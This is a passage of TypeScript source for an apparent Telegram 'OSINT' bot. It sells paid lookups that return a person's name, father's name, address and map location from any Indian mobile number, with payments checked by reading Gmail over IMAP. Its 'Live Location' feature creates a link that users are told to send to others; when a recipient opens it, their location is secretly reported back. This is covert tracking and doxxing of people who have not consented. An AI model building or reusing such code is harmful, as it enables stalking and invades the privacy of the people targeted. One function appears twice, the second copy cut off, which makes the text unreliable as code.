          socket.write(`A2 SELECT INBOX\r\n`);
        } else if (/A1 (NO|BAD)/i.test(buffer)) {
          clearTimeout(timer);
          finish({ ok: false, emails: [], error: 'Invalid Gmail ID or 16-digit App Password' });
        }
      } else if (step === 'SELECT') {
        if (/A2 OK/i.test(buffer)) {
          const existsMatch = buffer.match(/\*\s+(\d+)\s+EXISTS/i);
          const totalMessages = existsMatch ? Number(existsMatch[1]) : 0;
          buffer = '';
          if (totalMessages <= 0) {
            clearTimeout(timer);
            socket.write(`A4 LOGOUT\r\n`);
            finish({ ok: true, emails: [] });
            return;
          }
          const startSeq = Math.max(1, totalMessages - 5);
          step = 'FETCH';
          socket.write(
            `A3 FETCH ${startSeq}:${totalMessages} (UID INTERNALDATE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE)])\r\n`
          );
        } else if (/A2 (NO|BAD)/i.test(buffer)) {
          clearTimeout(timer);
          finish({ ok: false, emails: [], error: 'Could not select Gmail INBOX' });
        }
      } else if (step === 'FETCH') {
        const partial = parseFetchBlocksFromBuffer(buffer);
        if (partial.length > 0) {
          void matchEmailsToOrders(Array.from(cachedGmailEmails.values()));
        }
        if (/A3 (OK|NO|BAD)/i.test(buffer)) {
          step = 'DONE';
          clearTimeout(timer);
          const parsedEmails = parseFetchBlocksFromBuffer(buffer);
          socket.write(`A4 LOGOUT\r\n`);
          finish({ ok: true, emails: parsedEmails });
        }
      }
    });

    socket.on('error', (err) => {
      clearTimeout(timer);
      finish({ ok: false, emails: [], error: err.message });
    });
  });
}

async function createFamGatewayOrder(user: UserProfile, plan: PricingPlan): Promise<PaymentOrder> {
  // 1. Auto-expire any older PENDING orders for this same user so they always get the EXACT plan amount!
  for (const existing of Object.values(state.orders)) {
    if (existing.userId === user.id && existing.status === 'PENDING') {
      existing.status = 'EXPIRED';
    }
  }

  const orderId = `HEX${Date.now().toString(36).toUpperCase().slice(-4)}${String(user.id).slice(-4)}`;
  const baseAmount = Number(plan.price);
  const nowMs = Date.now();

  // Only add paise if a DIFFERENT user currently has an active PENDING order for this exact amount
  const activeOtherAmounts = new Set(
    Object.values(state.orders)
      .filter((o) => o.status === 'PENDING' && o.userId !== user.id && nowMs - new Date(o.createdAt).getTime() < 10 * 60 * 1000)
      .map((o) => Number(o.payableAmount || o.amount).toFixed(2))
  );

  let finalAmountNum = baseAmount;
  if (activeOtherAmounts.has(finalAmountNum.toFixed(2))) {
    for (let p = 1; p <= 99; p++) {
      const candidate = Number((baseAmount + p / 100).toFixed(2));
      if (!activeOtherAmounts.has(candidate.toFixed(2))) {
        finalAmountNum = candidate;
        break;
      }
    }
  }

  const payableAmount = Number.isInteger(finalAmountNum) ? String(finalAmountNum) : finalAmountNum.toFixed(2);
  const merchantUpi = (state.config.merchantUpiId || '8252464080@fam').trim();
  const merchantName = (state.config.merchantName || 'Vashu Dev').trim();
  const appUrl = (
    process.env.APP_URL ||
    state.config.websiteUrl ||
    'https://ais-dev-wjgc6ech6tjeb4fxmiq54f-739805761259.asia-southeast1.run.app'
  ).replace(/\/$/, '');

  const upiIntentUrl = `upi://pay?pa=${encodeURIComponent(merchantUpi)}&pn=${encodeURIComponent(
    merchantName
  )}&am=${encodeURIComponent(payableAmount)}&cu=INR&tn=${encodeURIComponent(orderId)}&tr=${encodeURIComponent(orderId)}`;

  let qrDataUrl = '';
  try {
    qrDataUrl = await QRCode.toDataURL(upiIntentUrl, {
      width: 520,
      margin: 2,
      color: {
        dark: '#090D16',
        light: '#FFFFFF',
      },
    });
  } catch (err: any) {
    console.error('QR generation error:', err.message);
  }

  const createdAt = new Date(nowMs).toISOString();
  const expiresAt = new Date(nowMs + 10 * 60 * 1000).toISOString();

  const order: PaymentOrder = {
    orderId,
    famOrderId: orderId,
    userId: user.id,
    userName: user.firstName,
    userUsername: user.username,
    planId: plan.id,
    planName: plan.name,
    amount: baseAmount,
    payableAmount,
    qrImageUrl: `${appUrl}/api/qr/${encodeURIComponent(orderId)}`,
    qrDataUrl,
    lastImapScanAt: 0,
    credits: plan.credits || 0,
    days: plan.days,
    status: 'PENDING',
    paymentUrl: `${appUrl}/?order=${encodeURIComponent(orderId)}`,
    upiIntentUrl,
    qrPayload: upiIntentUrl,
    gatewaySource: 'direct_gmail',
    createdAt,
    expiresAt,
  };

  state.orders[order.orderId] = order;
  saveState();
  addLog(
    'PAYMENT',
    `Created Auto-QR Order ${order.orderId} (₹${payableAmount} for ${plan.days} Days VIP)`,
    user.id,
    user.firstName
  );
  return order;
}

function resolveFamOrderId(order: PaymentOrder): string {
  return order.famOrderId || order.orderId;
}

async function checkFamGatewayOrderStatus(
  order: PaymentOrder,
  forceImap = false
): Promise<{ paid: boolean; message: string }> {
  if (order.status === 'PAID') {
    return { paid: true, message: 'Payment Verified! VIP Activated.' };
  }

  // 1. Check already-cached Gmail messages first (instant 0ms!)
  if (cachedGmailEmails.size > 0) {
    await matchEmailsToOrders(Array.from(cachedGmailEmails.values()), order);
    if ((state.orders[order.orderId]?.status as string) === 'PAID' || (order.status as string) === 'PAID') {
      return {
        paid: true,
        message: `Payment Verified! ${order.days}D VIP Activated.`,
      };
    }
  }

  // 2. Trigger persistent IMAP EXAMINE INBOX (+ UID FETCH if UIDNEXT increased)
  if (persistentReady) {
    if (forceImap) {
      await triggerImapExamineCycle();
    } else if (!persistentBusy) {
      void triggerImapExamineCycle();
    }
  } else {
    const now = Date.now();
    if (!isImapScanning && (forceImap || now - lastGmailScanAt >= 5000)) {
      isImapScanning = true;
      lastGmailScanAt = now;
      try {
        const imapRes = await fetchRecentGmailPaymentEmails();
        if (imapRes.ok && imapRes.emails.length > 0) {
          await matchEmailsToOrders(imapRes.emails, order);
        }
      } catch (err: any) {
        console.error('Gmail auto-verify scan error:', err.message);
      } finally {
        isImapScanning = false;
      }
    }
  }

  if ((state.orders[order.orderId]?.status as string) === 'PAID' || (order.status as string) === 'PAID') {
    return {
      paid: true,
      message: `Payment Verified! ${order.days}D VIP Activated.`,
    };
  }

  return {
    paid: false,
    message: `Waiting for ₹${order.payableAmount || order.amount} payment...`,
  };
}

function fulfillOrder(order: PaymentOrder, utr: string) {
  if (order.status === 'PAID') return;
  order.status = 'PAID';
  order.utr = utr;
  order.paidAt = new Date().toISOString();

  const user = state.users[String(order.userId)];
  if (user) {
    if (order.credits > 0) {
      user.credits += order.credits;
    }
    if (order.days > 0) {
      const now = new Date();
      const base = user.premiumUntil && new Date(user.premiumUntil) > now ? new Date(user.premiumUntil) : now;
      base.setDate(base.getDate() + order.days);
      user.isPremium = true;
      user.premiumUntil = base.toISOString();
    }
    user.lastPlanName = order.planName;
    user.totalSpent = (user.totalSpent || 0) + order.amount;
  }
  saveState();
  addLog('PAYMENT', `Order ${order.orderId} PAID (${order.days} Days VIP, Rs.${order.amount})`, order.userId, order.userName);
}

async function fulfillOrderAndNotify(order: PaymentOrder, utr: string) {
  const wasAlreadyPaid = order.status === 'PAID';
  fulfillOrder(order, utr);
  if (wasAlreadyPaid) return;

  const user = state.users[String(order.userId)];
  if (!user || typeof user.id !== 'number' || user.id >= 900000000) return;

  const paidCaption =
    `<b>✓ ${toThinSans('Payment Verified')}</b>\n\n` +
    `<b>• ${toThinSans('Plan')}:</b> ${escapeHtml(toThinSans(`${order.planName} (${order.days} Days)`))}\n` +
    `<b>• ${toThinSans('Amount')}:</b> ₹${toThinSans(order.payableAmount || String(order.amount))}\n` +
    `<b>• ${toThinSans('Status')}:</b> ${getUserStatusBadge(user)}`;

  const paidMarkup = {
    inline_keyboard: [
      [
        buildInlineButton(`❖ ${toThinSans('Number to Info')}`, { callback_data: 'nav_num_info', style: 'success' }),
        buildInlineButton(`◈ ${toThinSans('My Profile')}`, { callback_data: 'nav_profile', style: 'primary' }),
      ],
      [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })],
    ],
  };

  try {
    if (order.botQrMessageId) {
      callTelegram('deleteMessage', { chat_id: user.id, message_id: order.botQrMessageId }, 4000).catch(() => {});
    }
    const sent = await callTelegram(
      'sendMessage',
      {
        chat_id: user.id,
        text: paidCaption,
        parse_mode: 'HTML',
        reply_markup: paidMarkup,
      },
      5000
    );
    if (sent?.ok && sent.result?.message_id) {
      user.lastBotMessageId = sent.result.message_id;
      user.lastBotMessageHasPhoto = false;
      saveState();
    }
  } catch {
    // ignore telegram notification error
  }
}

// ============================================================================
// TELEGRAM BOT API ENGINE — NATIVE PHOTO ON /START ONLY + CLEAN THIN FONT
// ============================================================================
let botStatus: {
  connected: boolean;
  botId?: number;
  username?: string;
  firstName?: string;
  lastError?: string;
  lastCheckedAt?: string;
} = { connected: false };

const telegramApiAgent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 30000,
  maxSockets: 25,
  family: 4,
});

const telegramPollAgent = new https.Agent({
  keepAlive: true,
  keepAliveMsecs: 30000,
  maxSockets: 5,
  family: 4,
});

function postTelegramJson(
  token: string,
  method: string,
  payload: Record<string, any>,
  timeoutMs: number,
  usePollAgent = false
): Promise<any> {
  return new Promise((resolve, reject) => {
    const bodyStr = JSON.stringify(payload);
    const req = https.request(
      {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${token}/${method}`,
        method: 'POST',
        agent: usePollAgent ? telegramPollAgent : telegramApiAgent,
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(bodyStr),
          Connection: 'keep-alive',
        },
      },
      (res) => {
        let chunks = '';
        res.setEncoding('utf8');
        res.on('data', (c) => {
          chunks += c;
        });
        res.on('end', () => {
          try {
            resolve(JSON.parse(chunks));
          } catch (e) {
            reject(e);
          }
        });
      }
    );

    const timer = setTimeout(() => {
      req.destroy(new Error(`Telegram ${method} timed out after ${timeoutMs}ms`));
    }, timeoutMs);

    req.on('error', (err) => {
      clearTimeout(timer);
      reject(err);
    });
    req.on('close', () => {
      clearTimeout(timer);
    });

    req.write(bodyStr);
    req.end();
  });
}

async function callTelegram(method: string, payload: Record<string, any> = {}, timeoutMs = 6000): Promise<any> {
  const token = state.config.botToken.trim();
  if (!token) throw new Error('Bot token is empty');
  const isPoll = method === 'getUpdates';

  for (let attempt = 1; attempt <= 2; attempt++) {
    try {
      const data: any = await postTelegramJson(token, method, payload, timeoutMs, isPoll);
      if (!data.ok && payload.reply_markup && String(data.description || '').toLowerCase().includes('style')) {
        const cleanedMarkup = JSON.parse(JSON.stringify(payload.reply_markup));
        if (cleanedMarkup.inline_keyboard) {
          for (const row of cleanedMarkup.inline_keyboard) {
            for (const btn of row) {
              delete btn.style;
            }
          }
        }
        return await postTelegramJson(
          token,
          method,
          { ...payload, reply_markup: cleanedMarkup },
          timeoutMs,
          isPoll
        );
      }
      return data;
    } catch (err: any) {
      if (attempt === 2) {
        throw err;
      }
      await new Promise((r) => setTimeout(r, 80));
    }
  }
}

// Keep the API socket warm so the very first button click is instant (~240ms instead of 850ms cold TLS)
setInterval(() => {
  if (botStatus.connected && state.config.botToken) {
    postTelegramJson(state.config.botToken.trim(), 'getMe', {}, 4000, false).catch(() => {});
  }
}, 20000);

async function registerBotMenuAndCommands() {
  const commands = [
    { command: 'start', description: toThinSans('Start Bot') },
  ];

  await Promise.allSettled([
    callTelegram('deleteMyCommands', {}, 5000),
    callTelegram('deleteMyCommands', { scope: { type: 'all_private_chats' } }, 5000),
    callTelegram('setMyCommands', { commands }, 5000),
    callTelegram('setMyCommands', { commands, scope: { type: 'all_private_chats' } }, 5000),
    callTelegram('setChatMenuButton', { menu_button: { type: 'commands' } }, 5000),
  ]);
}

async function verifyBotConnection() {
  try {
    const res = await callTelegram('getMe', {}, 5000);
    if (res && res.ok && res.result) {
      botStatus = {
        connected: true,
        botId: res.result.id,
        username: res.result.username,
        firstName: res.result.first_name,
        lastCheckedAt: new Date().toISOString(),
      };
      if (res.result.username) {
        state.config.botUsername = res.result.username;
      }
      await callTelegram('deleteWebhook', { drop_pending_updates: false }, 4000).catch(() => {});
      void registerBotMenuAndCommands();

      // Sync offset with latest update_id on this bot token so old/mismatched update_id never loops
      try {
        const latestRes = await callTelegram('getUpdates', { offset: -1, limit: 1, timeout: 0 }, 4000);
        if (latestRes?.ok && Array.isArray(latestRes.result) && latestRes.result.length > 0) {
          const latestId = latestRes.result[latestRes.result.length - 1].update_id;
          if (typeof latestId === 'number') {
            state.lastTelegramUpdateId = latestId;
            processedUpdateIds.add(latestId);
            saveState();
            await callTelegram('getUpdates', { offset: latestId + 1, limit: 1, timeout: 0 }, 4000).catch(() => {});
          }
        }
      } catch {
        // ignore startup sync error
      }
    } else {
      botStatus = {
        connected: false,
        lastError: res?.description || 'Unknown Telegram error',
        lastCheckedAt: new Date().toISOString(),
      };
    }
  } catch (err: any) {
    botStatus = {
      connected: false,
      lastError: err.message,
      lastCheckedAt: new Date().toISOString(),
    };
  }
}

function buildInlineButton(
  text: string,
  options: { callback_data?: string; url?: string; copy_text?: string; style?: InlineButtonStyle }
) {
  const btn: Record<string, any> = { text };
  if (options.url) btn.url = options.url;
  else if (options.copy_text) btn.copy_text = { text: options.copy_text };
  else if (options.callback_data) btn.callback_data = options.callback_data;
  btn.style = options.style && options.style !== 'default' ? options.style : 'primary';
  return btn;
}

// Sends standard Telegram Photo/Video ONLY when view.withMedia is true (/start message)
// Otherwise sends a fast, clean text message!
async function sendReplyMessage(
  chatId: number,
  user: UserProfile,
  view: { text: string; reply_markup: any; withMedia?: boolean },
  replyToMessageId?: number
) {
  const cfg = state.config;
  if (view.withMedia) {
    if (cfg.mediaType === 'video' && (cfg.telegramFileId || cfg.bannerVideoUrl)) {
      const videoPayload: Record<string, any> = {
        chat_id: chatId,
        video: cfg.telegramFileId || cfg.bannerVideoUrl,
        caption: view.text,
        parse_mode: 'HTML',
        reply_markup: view.reply_markup,
      };
      if (replyToMessageId) videoPayload.reply_to_message_id = replyToMessageId;
      const vidRes = await callTelegram('sendVideo', videoPayload, 7000);
      if (vidRes?.ok && vidRes.result?.message_id) {
        if (vidRes.result.video?.file_id && !cfg.telegramFileId) {
          cfg.telegramFileId = vidRes.result.video.file_id;
        }
        user.lastBotMessageId = vidRes.result.message_id;
        user.lastBotMessageHasPhoto = true;
        saveState();
        return;
      }
    } else {
      const photoSource = cfg.telegramFileId || normalizeBannerImageUrlSync(cfg.bannerUrl);
      const photoPayload: Record<string, any> = {
        chat_id: chatId,
        photo: photoSource,
        caption: view.text,
        parse_mode: 'HTML',
        reply_markup: view.reply_markup,
      };
      if (replyToMessageId) photoPayload.reply_to_message_id = replyToMessageId;
      const photoRes = await callTelegram('sendPhoto', photoPayload, 7000);
      if (photoRes?.ok && photoRes.result?.message_id) {
        // Cache Telegram file_id so future /start commands take ~200ms instead of re-fetching URL!
        if (Array.isArray(photoRes.result.photo) && photoRes.result.photo.length > 0 && !cfg.telegramFileId) {
          cfg.telegramFileId = photoRes.result.photo[photoRes.result.photo.length - 1].file_id;
        }
        user.lastBotMessageId = photoRes.result.message_id;
        user.lastBotMessageHasPhoto = true;
        saveState();
        return;
      }
    }
  }

  const payload: Record<string, any> = {
    chat_id: chatId,
    text: view.text,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    reply_markup: view.reply_markup,
  };
  if (replyToMessageId) {
    payload.reply_to_message_id = replyToMessageId;
  }
  const res = await callTelegram('sendMessage', payload, 5000);
  if (res?.ok && res.result?.message_id) {
    user.lastBotMessageId = res.result.message_id;
    user.lastBotMessageHasPhoto = false;
    saveState();
  }
}

// Updates the existing message in-place (editMessageText / editMessageCaption) without sending new messages!
async function editSectionInPlace(
  chatId: number,
  messageId: number,
  user: UserProfile,
  view: { text: string; reply_markup: any; withMedia?: boolean },
  isMediaMessage?: boolean
) {
  const hasPhoto =
    typeof isMediaMessage === 'boolean' ? isMediaMessage : Boolean(user.lastBotMessageHasPhoto);
  const isQrPhotoMsg = Object.values(state.orders).some((o) => o.botQrMessageId === messageId);

  // If returning from a QR code photo message, remove the QR photo so only 1 clean message remains
  if (hasPhoto && isQrPhotoMsg) {
    await callTelegram('deleteMessage', { chat_id: chatId, message_id: messageId }, 4000).catch(() => {});
    await sendReplyMessage(chatId, user, { ...view, withMedia: false });
    return;
  }

  if (hasPhoto) {
    const res = await callTelegram(
      'editMessageCaption',
      {
        chat_id: chatId,
        message_id: messageId,
        caption: view.text,
        parse_mode: 'HTML',
        reply_markup: view.reply_markup,
      },
      5000
    );
    const desc = String(res?.description || '').toLowerCase();
    if (res?.ok || desc.includes('message is not modified')) {
      user.lastBotMessageId = messageId;
      user.lastBotMessageHasPhoto = true;
      saveState();
      return;
    }
    const textFallback = await callTelegram(
      'editMessageText',
      {
        chat_id: chatId,
        message_id: messageId,
        text: view.text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: view.reply_markup,
      },
      5000
    );
    const textDesc = String(textFallback?.description || '').toLowerCase();
    if (textFallback?.ok || textDesc.includes('message is not modified')) {
      user.lastBotMessageId = messageId;
      user.lastBotMessageHasPhoto = false;
      saveState();
      return;
    }
  } else {
    const res = await callTelegram(
      'editMessageText',
      {
        chat_id: chatId,
        message_id: messageId,
        text: view.text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: view.reply_markup,
      },
      5000
    );
    const desc = String(res?.description || '').toLowerCase();
    if (res?.ok || desc.includes('message is not modified')) {
      user.lastBotMessageId = messageId;
      user.lastBotMessageHasPhoto = false;
      saveState();
      return;
    }
    const capFallback = await callTelegram(
      'editMessageCaption',
      {
        chat_id: chatId,
        message_id: messageId,
        caption: view.text,
        parse_mode: 'HTML',
        reply_markup: view.reply_markup,
      },
      5000
    );
    const capDesc = String(capFallback?.description || '').toLowerCase();
    if (capFallback?.ok || capDesc.includes('message is not modified')) {
      user.lastBotMessageId = messageId;
      user.lastBotMessageHasPhoto = true;
      saveState();
      return;
    }
  }

  // Only if the message was deleted by user, send a single replacement
  await sendReplyMessage(chatId, user, { ...view, withMedia: false });
}

function escapeHtml(str: string): string {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function getAppBaseUrl(): string {
  const publicSharedUrl = 'https://ais-pre-wjgc6ech6tjeb4fxmiq54f-739805761259.asia-southeast1.run.app';
  const raw = (process.env.APP_URL || state.config.websiteUrl || publicSharedUrl).replace(/\/$/, '');
  if (raw.includes('famgateway.in') || raw.includes('ais-dev-')) {
    return publicSharedUrl;
  }
  return raw;
}

function getUserReferralLink(user: UserProfile): string {
  const botUser = (state.config.botUsername || 'HexxOsint_bot').replace(/^@/, '').trim();
  return `https://t.me/${botUser}?start=ref_${user.referralCode}`;
}

function getUserTrackingUrl(user: UserProfile): string {
  const token = user.activeTrackToken || `LOC${String(user.id).slice(-5)}`;
  return `${getAppBaseUrl()}/t/${token}`;
}

// ============================================================================
// USER VIEWS — EASY EVERYDAY LANGUAGE, 4-LINE HOME KEYBOARD & GOOGLE MAPS
// ============================================================================
function buildHomeInlineKeyboard() {
  const groupUrl = (state.config.groupUrl || state.config.channelUrl || 'https://t.me/followxpresss').trim();
  const formattedGroupUrl = groupUrl.startsWith('http') ? groupUrl : `https://t.me/${groupUrl.replace(/^@/, '')}`;
  return {
    inline_keyboard: [
      [
        buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
        buildInlineButton(`👤 ${toThinSans('My Profile')}`, { callback_data: 'nav_profile', style: 'primary' }),
      ],
      [
        buildInlineButton(`🔍 ${toThinSans('Number to Info')}`, { callback_data: 'nav_num_info', style: 'primary' }),
      ],
      [
        buildInlineButton(`📍 ${toThinSans('Number to Location')}`, { callback_data: 'nav_num_loc', style: 'success' }),
      ],
      [
        buildInlineButton(`💬 ${toThinSans('My Group')}`, { url: formattedGroupUrl, style: 'success' }),
        buildInlineButton(`📜 ${toThinSans('History')}`, { callback_data: 'nav_history', style: 'danger' }),
      ],
    ],
  };
}
function renderBotHomeView(user: UserProfile) {
  const userLink = `<a href="tg://user?id=${user.id}">${escapeHtml(toThinSans(user.firstName))}</a>`;
  const text =
    `<b>❤️ ${toThinSans('Hello')} ${userLink}</b>\n\n` +
    `${toThinSans('Welcome to')} <b>${escapeHtml(toThinSans(state.config.botName))}</b>\n\n` +
    `${toThinSans('Yaha koi bhi 10-digit Mobile Number bhejo, uska Name aur Google Maps Location turant mil jayega.')}\n\n` +
    `<b>${toThinSans('Example')}:</b> ${toThinSans('9876543210')}`;

  return {
    text,
    reply_markup: buildHomeInlineKeyboard(),
    // ONLY /start (Home View) has image enabled!
    withMedia: state.config.bannerEnabled,
  };
}

function renderBotNumberPromptView(user: UserProfile) {
  const { isVip, dailyLimit, remainingToday } = syncUserDailyUsage(user);
  const quotaText = isVip
    ? `<b>✦ ${toThinSans('VIP Unlimited')}</b>`
    : `<b>◈ ${toThinSans(`${remainingToday} / ${dailyLimit} Free Bacha Hai Aaj`)}</b>`;

  const text =
    `<b>📍 ${toThinSans('Number to Location')}</b>\n\n` +
    `${toThinSans('Chat me koi bhi 10-digit Mobile Number likh kar bhejo. Uska Name aur Google Map Location aa jayega.')}\n\n` +
    `<b>• ${toThinSans('Today Limit')}:</b> ${quotaText}\n` +
    `<b>• ${toThinSans('Example')}:</b> ${toThinSans('9876543210')}`;

  const keyboard: any[][] = [
    [
      buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
      buildInlineButton(`🛰️ ${toThinSans('Live Location')}`, { callback_data: 'nav_live_loc', style: 'primary' }),
    ],
    [buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' })],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function renderBotLimitReachedView(user: UserProfile) {
  const { dailyLimit } = syncUserDailyUsage(user);
  const refLink = getUserReferralLink(user);
  const bonus = state.config.referralBonusCredits || 2;

  const title = `<b>⚡ ${toThinSans('Aaj Ka Free Limit Khatam Ho Gaya')}</b>`;

  const body =
    `${toThinSans(`Normal user ko roz ${dailyLimit} Free Number Location milta hai (${dailyLimit}/${dailyLimit} aaj use ho gaya).`)}\n\n` +
    `${toThinSans(`Unlimited Location dekhne ke liye ₹29 wala VIP Plan lein, ya apna Refer Link dosto ko bhej kar +${bonus} Free Search paayein.`)}`;

  const keyboard: any[][] = [
    [
      buildInlineButton(`👑 ${toThinSans('Buy VIP Plan (₹29)')}`, { callback_data: 'nav_pricing', style: 'success' }),
    ],
    [
      buildInlineButton(`🎁 ${toThinSans('Copy Refer Link')}`, { copy_text: refLink, style: 'primary' }),
    ],
    [
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
    ],
  ];

  return {
    text: `${title}\n\n${body}`,
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function renderBotLiveLimitReachedView(user: UserProfile) {
  const { liveLimit } = syncUserLiveUsage(user);
  const refLink = getUserReferralLink(user);

  const text =
    `<b>🛰️ ${toThinSans('Free Live Location Khatam Ho Gaya')}</b>\n\n` +
    `${toThinSans(`Normal user ko sirf ${liveLimit} baar Free Live Location milta hai (${liveLimit}/${liveLimit} use ho gaya).`)}\n\n` +
    `<b>• ${toThinSans('1 Week VIP')}:</b> ₹${toThinSans('29')} (${toThinSans('Unlimited')})\n` +
    `<b>• ${toThinSans('1 Month VIP')}:</b> ₹${toThinSans('49')} (${toThinSans('Unlimited')})\n` +
    `<b>• ${toThinSans('1 Year VIP')}:</b> ₹${toThinSans('119')} (${toThinSans('Unlimited')})\n\n` +
    `${toThinSans('Unlimited Live Location ke liye niche se VIP Plan buy karein:')}`;

  const keyboard: any[][] = [
    [
      buildInlineButton(`👑 ${toThinSans('Buy VIP Plan (₹29)')}`, { callback_data: 'nav_pricing', style: 'success' }),
    ],
    ...(user.activeTrackToken
      ? [
          [
            buildInlineButton(`📋 ${toThinSans('Copy Old Link')}`, {
              copy_text: getUserTrackingUrl(user),
              style: 'primary' as InlineButtonStyle,
            }),
          ],
        ]
      : []),
    [
      buildInlineButton(`🎁 ${toThinSans('Copy Refer Link')}`, { copy_text: refLink, style: 'primary' }),
    ],
    [
      buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
    ],
  ];

  return {
    text,
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function renderBotLiveLocationView(user: UserProfile, notice?: string) {
  const { isVip, liveLimit, usedLifetime, remainingLifetime } = syncUserLiveUsage(user);
  const captures = Array.isArray(user.liveCaptures) ? user.liveCaptures : [];
  const lastCapture = captures[0];

  if (!isVip && !user.activeTrackToken && remainingLifetime <= 0) {
    return renderBotLiveLimitReachedView(user);
  }

  const quotaBadge = isVip
    ? `<b>✦ ${toThinSans('VIP Unlimited')}</b>`
    : `<b>◈ ${toThinSans(`${remainingLifetime}/${liveLimit} Free Bacha Hai (${usedLifetime} Used)`)}</b>`;

  const lines: string[] = [
    `<b>🛰️ ${toThinSans('Live Location')}</b>`,
    ...(notice ? [`<b>✓ ${escapeHtml(toThinSans(notice))}</b>`] : []),
    ``,
    `<b>• ${toThinSans('Limit')}:</b> ${quotaBadge}`,
  ];

  const keyboard: any[][] = [];

  if (user.activeTrackToken) {
    const trackUrl = getUserTrackingUrl(user);
    lines.push(
      `<b>• ${toThinSans('Your Link')}:</b>\n<code>${escapeHtml(trackUrl)}</code>`,
      ``,
      `${toThinSans('Ye link copy karke bhejein. Jab samne wala link kholega, uska Live Google Map Location yaha chat me aa jayega.')}`
    );

    if (lastCapture) {
      lines.push(
        ``,
        `<b>📍 ${toThinSans('Last Location Found')}:</b>`,
        `<b>• ${toThinSans('Location')}:</b> ${escapeHtml(toThinSans(lastCapture.address))}`,
        `<b>• ${toThinSans('Google Map')}:</b> <a href="${escapeHtml(lastCapture.mapsUrl)}">${toThinSans('Open Map')}</a>`
      );
    }

    keyboard.push([
      buildInlineButton(`📋 ${toThinSans('Copy Link')}`, {
        copy_text: trackUrl,
        style: 'success',
      }),
    ]);

    if (lastCapture) {
      keyboard.push([
        buildInlineButton(`🗺️ ${toThinSans('Open Google Maps')}`, {
          url: lastCapture.mapsUrl,
          style: 'primary',
        }),
      ]);
    }

    keyboard.push([
      buildInlineButton(`🔄 ${toThinSans('Check Again')}`, {
        callback_data: 'nav_live_loc',
        style: 'primary',
      }),
      buildInlineButton(`➕ ${toThinSans('New Link')}`, {
        callback_data: 'create_live_link',
        style: isVip || remainingLifetime > 0 ? 'success' : 'danger',
      }),
    ]);
  } else {
    lines.push(
      ``,
      `${toThinSans('Apna Live Location Link banane ke liye niche green button dabayein (Normal User: 1 Free • VIP User: Unlimited):')}`
    );
    keyboard.push([
      buildInlineButton(
        `🛰️ ${toThinSans(isVip ? 'Create Live Location Link' : 'Create Free Link (1/1)')}`,
        {
          callback_data: 'create_live_link',
          style: 'success',
        }
      ),
    ]);
  }

  keyboard.push([
    buildInlineButton(`👑 ${toThinSans('Get Premium')}`, { callback_data: 'nav_pricing', style: 'success' }),
    buildInlineButton(`« ${toThinSans('Back')}`, { callback_data: 'nav_home', style: 'danger' }),
  ]);

  return {
    text: lines.join('\n'),
    reply_markup: { inline_keyboard: keyboard },
    withMedia: false,
  };
}

function cleanMapQueryFromRecord(rec: any, areaLabel: string): { displayAddress: string; mapUrl: string } {
  const rawAddr = String(rec?.address || areaLabel || '').replace(/!/g, ', ');
  const circle = String(rec?.circle || '').trim();
  const pName = String(rec?.name || '').trim();
  const fName = String(rec?.fatherName || '').trim();
  const parts = rawAddr.split(/[,;|\n]+/).map((p) => p.trim()).filter(Boolean);
  const cleaned: string[] = [];
  for (let p of parts) {
    p = p.replace(/\b(S\/O|W\/O|D\/O|C\/O|H\/O|F\/O|M\/O)\b[^,]*/gi, '').trim();
    if (pName && pName !== 'Not found' && p.toLowerCase() === pName.toLowerCase()) continue;
    if (fName && fName !== 'Not found' && p.toLowerCase() === fName.toLowerCase()) continue;
    p = p.replace(/^(H\.?\s*NO\.?|HOUSE\s*NO\.?|FLAT\s*NO\.?|PLOT\s*NO\.?|WARD\s*NO\.?)\s*[-:#.]?\s*[A-Z0-9/-]+\s*/i, '').trim();
    if (p.length >= 2 && !cleaned.some((c) => c.toLowerCase() === p.toLowerCase())) cleaned.push(p);
  }
  if (circle && circle !== 'Not found' && !cleaned.some((c) => c.toLowerCase().includes(circle.toLowerCase()))) {
    cleaned.push(circle);
  }
  const displayAddress = cleaned.join(', ') || areaLabel || 'India';
  const query = cleaned.slice(-4).join(', ') || displayAddress;
  const mapUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(query + ', India')}`;
  return { displayAddress, mapUrl };
}

function cleanMapQueryFromRecord(rec: any, areaLabel: string): { displayAddress: string; mapUrl: string } {
  const rawAddr = String(rec?.address || areaLabel || '').replace(/!/g, ', ');
  const circle = String(rec?.circle || '').trim();
  const pName = String(rec?.name || '').trim();
  const fName = String(rec?.fatherName || '').trim();
  const parts = rawAddr.split(/[,;|\n]+/).map((p) => p.trim()).filter(Boolean);
  const cleaned: string[] = [];
  for (let p of parts) {
    p = p.replace(/\b(S\/O|W\/O|D\/O|C\/O|H\/O|F\/O|M\/O)\b[^,]*/gi, '').trim();
    if (pName && pName !== 'Not found' && p.toLowerCase() === pName.toLowerCase()) continue;
    if (fName && fName !== 'Not found' && p.toLowerCase() === fName.toLowerCase()) continue;
    p = p.replace(/^(H\.?\s*NO\.?|HOUSE\s*NO\.?|FLAT\s*NO\.?|PLOT\s*NO\.?|WARD\s*NO\.?)\s*[-:#.]?\s*[A-Z0-9/-]+\s*/i, '').trim();
    if (p.length >= 2 && !cleaned.some((c) => c.toLowerCase() === p.toLowerCase())) cleaned.push(p);
  }
